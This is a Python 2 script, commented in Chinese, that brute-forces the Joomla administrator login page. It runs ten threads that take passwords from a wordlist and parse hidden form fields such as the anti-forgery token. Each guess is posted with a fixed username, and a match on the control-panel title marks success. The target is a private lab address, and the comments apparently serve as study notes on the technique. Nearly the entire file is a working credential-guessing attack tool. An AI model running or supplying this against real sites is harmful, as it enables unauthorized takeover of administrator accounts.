#-*- coding:utf8 -*-

import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

#简要设置
user_thread = 10
username ="giantbranch"
wordlist_file ="./mydict.txt"
resume = None

#特点目标设置
target_url = "http://192.168.1.105/Joomla/administrator/index.php"
target_post = "http://192.168.1.105/Joomla/administrator/index.php"

username_field = "username"
password_field = "passwd"

#登陆成功后，title里面就有下面的文字，注意是语言是英文才是下面的哦　
success_check = "Administration - Control Panel"

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    #当我们调用feed函数时，他将整个HTML文档传递进来并在遇到每个标签时调用下面这个函数(根据函数名就容易理解)
    def handle_starttag(self, tag, attrs):
        #判断是否是input标签
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                #input标签里面不是有name,value,type等属性吗，这里只判断name和value
                #不过我觉得第二个if是多余的
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
                if tag_name is not None:
                    self.tag_results[tag_name] = value

class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print "Finished setting up for %s" % username

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            #从字典获取密码，并去除右边的空格
            brute = self.password_q.get().rstrip()
            #使用FileCookieJar类，将cookie值储存到文件，参数为文件名，可用于存取cookie
            jar = cookielib.FileCookieJar("cookies")
            #用上面的jar初始化urllib2打开器,这样下面请求url时，就会把cookie值存到那个文件中
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response =opener.open(target_url)

            page = response.read()

            print  "Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize())

            #解析隐藏区域(表单)
            parser = BruteParser()
            parser.feed(page)

            #已经含有隐藏表单的键值
            post_tags = parser.tag_results

            #添加我们的用户名和密码区域
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            #输出post的数据(键值)
            # for key,value in post_tags.items():
            #     print key,':',value

            #url编码post的数据，开始尝试登陆
            login_data = urllib.urlencode(post_tags)
            login_response =opener.open(target_post, login_data)
            login_result = login_response.read()

            #　判断是否登陆成功
            if success_check in login_result:
                #设置为True，让循环结束
                self.found = True

                print "[*] Bruteforce successful."
                print "[*] Username: %s" % username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."

def built_wordlist(wordlist_file):
    #读入字典文件
    fd = open(wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue.Queue()

    for word in raw_words:
        #删除字符串末尾的空格
        word  = word.rstrip()
        #如果是延续上一次
        if resume is not None:

            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume
        else:
            words.put(word)
    return words

#构造字典
words = built_wordlist(wordlist_file)

#初始化Bruter类
bruter_obj = Bruter(username, words)
#调用run_bruteforce函数
bruter_obj.run_bruteforce()
